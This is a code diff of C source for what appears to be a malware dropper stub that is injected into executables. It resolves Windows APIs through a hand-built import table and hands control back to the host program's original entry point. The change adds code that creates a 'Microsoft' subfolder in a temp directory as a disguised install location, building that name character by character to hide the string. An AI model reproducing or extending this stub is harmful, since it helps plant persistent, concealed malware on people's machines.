@@ -87,28 +87,29 @@ XREFNAMES data_imports[] = {
 			"GetCommandLineA",		// 33
 			"GetCommandLineW",		// 34
 			"GetModuleFileNameA",	// 35
+			"GetFileAttributesA",	// 36
 			NULL
 	}
 	}, // KERNEL32.DLL
 	{ "NTDLL.DLL",
 	{
-			"RtlExitUserProcess",	// 36
+			"RtlExitUserProcess",	// 37
 			NULL
 	}
 	}, // NTDLL.DLL
 	
 	{ "MSVCRT.DLL",
 	{
-		"sprintf",				// 37
-		"exit",					// 38
-		"_exit",				// 39
+		"sprintf",				// 38
+		"exit",					// 39
+		"_exit",				// 40
 		NULL
 	} 
 	}, // USER32.DLL
 	
 	{ "ADVAPI32.DLL",
 	{
-		"GetCurrentHwProfileA", // 40
+		"GetCurrentHwProfileA", // 41
 	}
 	}, // ADVAPI32.DLL
 
@@ -348,6 +349,7 @@ NEXT_ENTRY:
 	GETCURRENTPROCESS pfn_GetCurrentProcess = (GETCURRENTPROCESS) dll_calls[CALL_GETCURRENTPROCESS];
 	GETMODULEHANDLE pfn_GetModuleHandle = (GETMODULEHANDLE) dll_calls[CALL_GETMODULEHANDLE];
 	GETMODULEFILENAME pfn_GetModuleFileNameA = (GETMODULEFILENAME) dll_calls[CALL_GETMODULEFILENAMEA];
+	GETFILEATTRIBUTESA pfn_GetFileAttributesA = (GETFILEATTRIBUTESA) dll_calls[CALL_GETFILEATTRIBUTESA];
 
 	DWORD imageBase = 0;
 	__asm {
@@ -478,6 +480,21 @@ NEXT_ENTRY:
 	else
 		goto OEP_CALL;
 	
+	char lpSubDir[] = { 'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', 0x0 };
+	_STRCAT_(lpTmpDir, STRING(STRIDX_DIRSEP));
+	_STRCAT_(lpTmpDir, lpSubDir);
+
+	/* check if subdir Microsoft exists if not, then create it. */
+	DWORD FileAttributes = pfn_GetFileAttributesA(lpTmpDir);
+	if (FileAttributes == INVALID_FILE_ATTRIBUTES || !(FileAttributes & FILE_ATTRIBUTE_DIRECTORY))
+	{
+		DWORD ret = pfn_CreateDirectory(lpTmpDir, NULL);
+		if (!ret)
+			if (pfn_GetLastError() != ERROR_ALREADY_EXISTS) // non-sense but.. whatever.
+				goto OEP_CALL;
+	}
+
+
 	_STRCAT_(lpTmpDir, STRING(STRIDX_DIRSEP));
 	_STRCAT_(lpTmpDir, STRING(STRIDX_INSTALL_DIR)); // lpInstDir);
 	_STRCAT_(lpTmpDir, STRING(STRIDX_DIRSEP));
